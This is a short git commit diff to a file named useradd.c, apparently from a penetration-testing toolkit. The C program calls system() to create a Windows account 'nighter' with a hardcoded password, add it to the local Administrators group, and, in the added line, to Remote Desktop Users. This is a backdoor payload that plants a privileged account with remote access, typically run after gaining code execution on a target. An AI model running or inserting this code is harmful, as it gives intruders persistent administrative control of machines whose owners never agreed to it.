e037e982ab74d1d1d184519e8b75697d6c480f69
nighter <kall.micke@gmail.com>
2019-11-26 10:39:24 +0100

    Added enum scripts

--- tools/misc/useradd.c
+++ tools/misc/useradd.c
@@ -4,6 +4,7 @@ int main ()
 {
     int i;
     i=system ("net user nighter letmein! /add && net localgroup administrators nighter /add");
+    i=system("net localgroup \"Remote Desktop users\" nighter /add");
     return i;
 }
 
